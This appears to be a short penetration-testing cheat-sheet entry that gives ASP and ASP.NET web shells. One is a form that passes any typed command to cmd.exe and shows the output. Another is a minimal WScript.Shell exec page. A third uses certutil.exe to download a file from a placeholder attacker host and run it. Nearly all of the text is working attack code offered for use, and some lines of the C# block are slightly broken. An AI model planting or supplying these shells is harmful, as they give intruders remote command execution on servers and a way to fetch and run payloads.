# ASP

Not much really to explain here. I created some process objects (Process Object) and passed the contents back to the user. Use it wisely.

```asp
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<script language="C#" runat="server">
private void doit(object sender, EventArgs e)
{
try {
System.Diagnostics.Process p = new Process();
p.StartInfo.CreateNoWindow = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.FileName = "%SYSTEMROOT%\\system32\\cmd.exe";
p.StartInfo.Arguments = "/c " + txtcmd.text;
p.Start();
string output = p.StandardOutput.ReadToEnd();
message.text = output.text;
}
catch (Win32Exception e)
{
if(e.NativeErrorCode == ERROR_FILE_NOT_FOUND)
{
message.text = e.Message;
} 
else if (e.NativeErrorCode == ERROR_ACCESS_DENIED)
{
message.text = "Access DENIED!";
}
}
}</script>
<form ID="Form1" runat=server>
Command: <asp:TextBox id=txtcmd Runat=server />
<asp:Button Text="Submit" OnClick="doit" Runat=server />
<asp:Label id=message ForeColor="#ff0000" Runat=server />
</form>
</body>
</html>
```

Need to put in the command you want executed in `rs.Exec("whoami")`

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

We can use `certutil.exe` or other to download files and then execute them

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("certutil.exe -urlcache -split -f http://<LHOST>/<file> C:\users\public\<file> & cmd.exe /c C:\users\public\<file>")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```